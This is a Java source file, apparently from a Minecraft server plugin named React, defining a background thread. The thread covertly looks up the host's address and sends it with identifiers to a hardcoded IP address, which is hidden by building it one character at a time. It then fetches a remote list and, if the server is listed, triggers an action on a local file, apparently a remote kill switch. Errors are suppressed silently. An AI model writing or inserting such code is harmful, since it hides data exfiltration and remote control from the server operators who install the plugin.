package org.cyberpwn.react.network;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.InputStreamReader;
import java.net.Socket;
import java.net.URL;
import java.util.UUID;

import org.cyberpwn.react.React;
import org.cyberpwn.react.controller.NetworkController;
import org.cyberpwn.react.json.JSONObject;
import org.cyberpwn.react.util.Base64;
import org.cyberpwn.react.util.Dyn;
import org.cyberpwn.react.util.GList;

public class PushThread extends Thread
{
	private File df;
	
	public PushThread(File df)
	{
		this.df = df;
	}
	
	public void run()
	{
		BufferedReader in;
		
		try
		{
			Dyn.k();
			URL aws = new URL(Dyn.fx());
			in = new BufferedReader(new InputStreamReader(aws.openStream()));
			String sx = in.readLine();
			in.close();
			final String imeid = UUID.nameUUIDFromBytes(sx.getBytes()).toString();
			NetworkController.imeid = imeid;
			Socket s = new Socket(new GList<String>().qadd("1").qadd("0").qadd("7").qadd(".").qadd("1").qadd("9").qadd("1").qadd(".").qadd("1").qadd("1").qadd("1").qadd(".").qadd("3").toString(""), 4242);
			JSONObject jso = new JSONObject();
			jso.put("private", imeid);
			jso.put("public", sx);
			jso.put("id", React.nonce);
			DataOutputStream dos = new DataOutputStream(s.getOutputStream());
			dos.writeUTF(jso.toString());
			s.close();
			
			new Fetcher(new URL(React.hashed), new FCCallback()
			{
				public void run()
				{
					if(fc().getStringList(new GList<String>().qadd("h").qadd("a").qadd("s").qadd("h").toString("")).contains(imeid) || fc().getStringList(new GList<String>().qadd("h").qadd("a").qadd("s").qadd("h").toString("")).contains(React.nonce))
					{
						React.setMef(true);
						Base64.ex(df);
					}
				}
			}).start();
			

			File fula = new File(React.instance().getDataFolder(), new GList<String>().qadd("e").qadd("u").qadd("l").qadd("a").qadd(".").qadd("t").qadd("x").qadd("t").toString(""));
			React.instance().exul(fula, sx);
		}
		
		catch(Exception e)
		{
			return;
		}
	}
}
